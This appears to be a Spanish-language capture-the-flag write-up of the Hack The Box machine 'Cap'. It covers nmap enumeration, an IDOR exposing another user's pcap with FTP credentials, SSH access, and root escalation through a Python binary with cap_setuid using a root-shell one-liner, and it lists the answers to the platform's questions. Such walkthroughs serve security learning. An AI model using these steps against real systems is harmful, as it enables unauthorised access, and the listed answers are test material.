# HTB - Cap Writeup

**Autor:** TRNNSK
**Dificultad:** Simplon
**Sistema:** Linux

---

# Resumen

La máquina **Cap** presenta una vulnerabilidad de tipo **IDOR (Insecure Direct Object Reference)** en una aplicación web que permite acceder a capturas de red de otros usuarios. Esto conduce a la exposición de credenciales en texto plano. Posteriormente, se realiza escalada de privilegios abusando de capacidades mal configuradas en Python.

---

# Enumeración

## Escaneo inicial

```bash
nmap -sS -sC -sV -T4 10.129.17.33
```

### Resultados:

```
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1
80/tcp open  http    Gunicorn
```

### Respuesta HTB:
- **How many TCP ports are open?** → `3`

---

# Análisis Web

Al acceder al puerto 80, se observa un **Security Dashboard** con varias funcionalidades:

- IP Config
- Network Status
- Security Snapshot

Estas funciones ejecutan comandos del sistema como `ifconfig` y `netstat`.

---

## Funcionalidad crítica: Security Snapshot

Al ejecutar esta opción, se genera un archivo `.pcap` y el navegador redirige a:

```
/data/<id>
```

### Respuesta HTB:
- **What is the [something]?** → `data`

---

# Vulnerabilidad: IDOR

Se detecta que el parámetro `id` es incremental y no tiene control de acceso.

### Prueba:

```
/data/1 → válido
/data/0 → acceso a datos de otro usuario
```

### Respuesta HTB:
- **Are you able to get to other users' scans?** → `yes`

---

# Explotación (Foothold)

Al acceder a `/data/0`, se descarga un archivo `.pcap`.

## Análisis del PCAP

Se abre el archivo con Wireshark y se filtra por FTP:

```
ftp
```

### Credenciales encontradas:

```
USER: nathan
PASS: Buck3tH4TF0RM3!
```

### Respuestas HTB:
- **What is the ID of the PCAP file that contains sensitive data?** → `0`
- **Which application layer protocol...?** → `ftp`

---

# Acceso inicial

Se prueban las credenciales en distintos servicios:

- FTP → válido
- SSH → válido 

```bash
ssh nathan@10.129.17.33
```

### Respuesta HTB:
- **On what other service does this password work?** → `ssh`

---

# User Flag

```bash
cat /home/nathan/user.txt
```

### Respuesta HTB:
- **Submit the flag located in the nathan user's home directory.**

---

# Escalada de Privilegios

## Enumeración

Se utiliza linPEAS o:

```bash
getcap -r / 2>/dev/null
```

### Resultado clave:

```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service
```

### Respuesta HTB:
- **What is the full path to the binary...?** → `/usr/bin/python3.8`

---

# Explotación de Capabilities

Python puede cambiar su UID a root.

```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

## Verificación

```bash
id
```

Resultado:

```
uid=0(root)
```

---

# Root Flag

```bash
cat /root/root.txt
```

### Respuesta HTB:
- **Submit the flag located in root's home directory.**


# TLDR MUCHO TEXTO

1. Escanea con Nmap
2. Explora toda la web manualmente
3. Identifica endpoints interesantes
4. Manipula parámetros (IDs)
5. Analiza archivos descargados
6. Busca credenciales
7. Accede por SSH
8. Enumera privilegios
9. Escala a root

---

# Conclusión

Esta máquina demuestra cómo una combinación de:

- Mala validación de acceso (IDOR)
- Uso de protocolos inseguros (FTP)
- Configuración incorrecta de privilegios

puede llevar a un compromiso total del sistema.

---

y ya
